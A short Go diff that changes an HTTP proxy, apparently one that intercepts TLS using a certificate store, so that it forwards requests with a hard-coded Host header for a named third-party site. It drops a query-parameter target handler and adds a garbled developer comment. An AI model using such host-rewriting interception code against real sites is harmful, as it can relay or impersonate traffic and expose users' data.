@@ -94,32 +94,10 @@ func main() {
         proxy := goproxy.NewProxyHttpServer()
         proxy.Verbose = true
 
-        var target string
-
-        proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {   //this is not calling ???
-        key := req.URL.Query()["url"]
-        if len(key) != 0 {
-
-                //url1, _ := session["url1"].(string)
-
-                //mu.Lock()
-
-                url1 := key[0]
-                fmt.Println(url1)
-
-                target = url1
-
-               }
-
-        })
-
-
         proxy.OnRequest().DoFunc(
                 func(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-                        target1, _ := url.Parse(target)
-                        host := target1.Host
-
-                        //host := "www.118218.fr"
+                    
+                        host := "www.118218.fr"
                         //path := "/en/ad/honda-vezel-rs-2017-for-sale-colombo-534"
                         log.Println(r.Header.Get("Host"))
                         r.Header.Set("Host", host)
@@ -468,7 +446,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// replace "Host" header
 				e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-					req.Host = r_host
+					req.Host = r_host  // dd req.Host ---this where setting target check whether path is comm,ing too..basicall we can get dynamiclaly
 				}
 
 				// fix origin
